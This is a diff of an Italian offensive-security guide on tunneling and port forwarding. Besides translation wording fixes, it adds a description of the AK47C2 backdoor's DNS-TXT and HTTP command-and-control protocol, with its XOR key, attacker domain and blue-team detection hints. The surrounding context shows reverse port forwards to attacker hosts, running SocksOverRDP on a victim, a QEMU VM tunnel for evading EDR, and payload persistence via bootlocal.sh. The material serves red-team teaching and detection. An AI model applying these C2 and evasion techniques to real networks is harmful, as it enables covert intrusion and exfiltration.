@@ -94,7 +94,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Ad esempio, inoltrando tutto il traffico verso 10.10.10.0/24
+Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:porta indicato.
+> In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il traffico viene inviato al Team Server e da lì all'host:porta indicato:
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -231,7 +231,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Accesso alle porte locali dell'agente
+### Accedi alle porte locali dell'agente
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -347,10 +347,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-È necessario avere **accesso RDP sul sistema**.\
+È necessario avere **accesso RDP al sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzione Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
@@ -360,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nel computer della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -368,13 +368,13 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxy il traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxyare il traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
 Puoi far navigare le app GUI di Windows attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
-In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare.
+In **Profile -> Proxification Rules** aggiungi il nome del programma da proxyare e le connessioni agli IP che vuoi proxyare.
 
 ## Bypass del proxy NTLM
 
@@ -444,7 +444,7 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Cambiare il DNS di proxychains
+#### Cambiare DNS di proxychains
 
 Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default** il server **DNS** che proxychains utilizza è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** puoi impostare l'IP del **domain controller**.
 
@@ -452,14 +452,48 @@ Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la rich
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## Tunneling ICMP
+### DNS TXT / HTTP JSON C2 personalizzato (AK47C2)
+
+L'attore Storm-2603 ha creato un **C2 a doppio canale ("AK47C2")** che sfrutta *solo* il traffico **DNS** in uscita e **HTTP POST** semplice – due protocolli che raramente vengono bloccati nelle reti aziendali.
+
+1. **Modalità DNS (AK47DNS)**
+• Genera un SessionID casuale di 5 caratteri (es. `H4T14`).
+• Precede `1` per *richieste di task* o `2` per *risultati* e concatena diversi campi (flags, SessionID, nome del computer).
+• Ogni campo è **XOR-criptato con la chiave ASCII `VHBD@H`**, codificato in esadecimale e incollato insieme con punti – terminando infine con il dominio controllato dall'attaccante:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Le richieste utilizzano `DnsQuery()` per i record **TXT** (e fallback **MG**).
+• Quando la risposta supera 0xFF byte, il backdoor **frammenta** i dati in pezzi da 63 byte e inserisce i marcatori:
+`s<SessionID>t<TOTAL>p<POS>` in modo che il server C2 possa riordinarli.
+
+2. **Modalità HTTP (AK47HTTP)**
+• Costruisce una busta JSON:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• L'intero blob è XOR-`VHBD@H` → esadecimale → inviato come corpo di un **`POST /`** con intestazione `Content-Type: text/plain`.
+• La risposta segue la stessa codifica e il campo `cmd` viene eseguito con `cmd.exe /c <command> 2>&1`.
+
+Note del Blue Team
+• Cerca richieste **TXT** insolite il cui primo label è un lungo esadecimale e termina sempre in un dominio raro.
+• Una chiave XOR costante seguita da ASCII-esadecimale è facile da rilevare con YARA: `6?56484244?484` (`VHBD@H` in esadecimale).
+• Per HTTP, segnala i corpi POST di tipo text/plain che sono puri esadecimali e multipli di due byte.
+
+{{#note}}
+L'intero canale si adatta all'interno di **richieste standard conformi agli RFC** e mantiene ogni label di sottodominio sotto 63 byte, rendendolo furtivo nella maggior parte dei log DNS.
+{{#endnote}}
+
+## Tunnel ICMP
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando richieste di echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -570,11 +604,11 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Inizia il connettore:
+Avvia il connettore:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL di ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile.
+Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -612,9 +646,9 @@ Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:900
 
 ## Tunnel Covert basati su VM con QEMU
 
-Il networking in modalità utente di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **collega una porta TCP/UDP sull'*host* e la inoltra nel *guest***. Quando il guest esegue un daemon SSH completo, la regola hostfwd ti fornisce una jump box SSH usa e getta che vive interamente all'interno di una VM effimera – perfetta per nascondere il traffico C2 da EDR poiché tutta l'attività e i file malevoli rimangono nel disco virtuale.
+Il networking in modalità utente di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **collega una porta TCP/UDP sull'*host* e la inoltra nel *guest***. Quando il guest esegue un daemon SSH completo, la regola hostfwd ti offre una jump box SSH usa e getta che vive interamente all'interno di una VM effimera – perfetta per nascondere il traffico C2 da EDR poiché tutta l'attività e i file dannosi rimangono nel disco virtuale.
 
-### Quick one-liner
+### Comando rapido
 ```powershell
 # Windows victim (no admin rights, no driver install – portable binaries only)
 qemu-system-x86_64.exe ^
@@ -640,7 +674,7 @@ Eseguire lo script con `cscript.exe //B update.vbs` mantiene la finestra nascost
 
 Poiché Tiny Core è senza stato, gli attaccanti di solito:
 
-1. Posano il payload in `/opt/123.out`
+1. Posizionano il payload in `/opt/123.out`
 2. Aggiungono a `/opt/bootlocal.sh`:
 
 ```sh
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Riferimenti
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)  
 
 {{#include ../banners/hacktricks-training.md}}
